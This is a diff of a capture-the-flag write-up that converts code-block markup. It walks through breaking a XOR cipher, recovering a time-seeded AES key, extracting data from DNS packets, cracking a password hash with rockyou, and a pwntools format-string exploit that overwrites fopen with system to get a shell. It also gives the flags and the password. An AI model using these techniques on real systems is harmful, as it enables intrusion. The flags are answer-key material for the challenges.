@@ -25,7 +25,7 @@ The pythons script have this code:
 
 This algorithm can be reversed to the following:
 
-{% highlight python %}
+```python
         a = PRNG()
         r = []
         for i in range(0,len(data),2):
@@ -34,7 +34,7 @@ This algorithm can be reversed to the following:
             r.append(z^a.next())
         with open('output.bin','wb') as fout:
             fout.write(bytes(r))
-{% endhighlight %}
+```
 
 This give the flag: improsegg{big_bad_xorosaurus_rex!!} and the next step
 
@@ -43,22 +43,22 @@ The next step contains an AES encrypted blob. However there is a small error gen
 
 The encrypting script uses the following to generate the key and IV:
 
-{% highlight python %}
+```python
         random.seed(int(datetime.now().strftime('%H%M%S')))
         key = randbytes(0x10).replace(b'\x00', b'\xff')
         iv = randbytes(0x10).replace(b'\x00', b'\xff')
-{% endhighlight %}
+```
 
 This might seem like the key can be hard to find. We get the IV and since the seed is on the form HHMMSS where HH 00<=23 and MM and SS is 00<=59 can it very fast be found that the time 19:43:55 will generate the save IV and therefore the same key used for encryption. Changing the code to the following will decrypt the file and write it to disk:
 
-{% highlight python %}
+```python
         random.seed(194355)
         key = randbytes(0x10).replace(b'\x00', b'\xff')
         iv = randbytes(0x10).replace(b'\x00', b'\xff')
         output_data = decrypt(key,iv,data)
         with open('output.zip','wb') as fout:
             fout.write(output_data)
-{% endhighlight %}
+```
 
 This will give a zip file which contains a pcap and a flag.
 
@@ -75,7 +75,7 @@ First four bytes is an int in little endian of the index in the file where the n
 
 Using this knowledge could the following python script be made:
 
-{% highlight python %}
+```python
 from scapy.all import *
 import sys
 
@@ -102,7 +102,7 @@ print(complete_passwd.split('___')[1].lower())
 with open('extracted.zip','wb') as fout:
     for i,x in sorted(data,key=lambda x:x[0]):
         fout.write(x)
-{% endhighlight %}
+```
 
 This gives and encrypted zip file, but we have the zip password from the DNS packets so it is a breeze to extract.
 
@@ -135,7 +135,7 @@ However, before the password entered by the user is hashed is it manipulated.
 
 The following python script reverse the algorithm and search for a password from rockyou or another file with passwords.
 
-{% highlight python %}
+```python
 def bit_not(n, numbits=8):
     return (1 << numbits) - 1 - n
 
@@ -154,7 +154,7 @@ with open(sys.argv[1], "rb") as f:
         hsh = hashlib.sha256(pw).hexdigest()
         if hsh == "96dbcccf4245ee916f5e2d3987cc2635313d871605e10805274b845c3ecd8722":
             print(line)
-{% endhighlight %}
+```
 
 The password is found to be nathanxyz123
 
@@ -179,10 +179,10 @@ It can be seen that the maps command is executed using a value in the `maps_file
 
 First step is to find the maps_file offset. Using gdb can the following be seen:
 
-{% highlight %}
+```
 gef➤  p &maps_file
 $1 = (<data variable, no debug info> *) 0x5555555580c0 <maps_file>
-{% endhighlight %}
+```
 
 This gives is an offset of maps_file to be at base of backdoor+0x40c0
 
@@ -195,16 +195,16 @@ This gives an offset from base to be at: base+0x4038
 
 The systemcall address that we want to write to the fopen position is found in the libc. The offset is found using the following command:
 
-{% highlight %}
+```
 gef➤  p &system
 $2 = (int (*)(const char *)) 0x7ffff7b462c0 <__libc_system>
-{% endhighlight %}
+```
 
 This gives and offset from the libc base to be at: +0x522c0
 
 Using the pwntools from python can the flag be found:
 
-{% highlight python %}
+```python
 from pwn import *
 
 # context.binary = ELF("./backdoor")
@@ -250,7 +250,7 @@ payload = fmtstr_payload(offset, writes)
 r.sendlineafter(b"Enter command: ", payload)
 r.sendlineafter(b"Enter command: ", b'maps')
 r.interactive()
-{% endhighlight %}
+```
 
 This will give you a shell where you can do a `cat flag.txt` and get the final flag: improsegg{backdooring_a_backdoor!?}
 
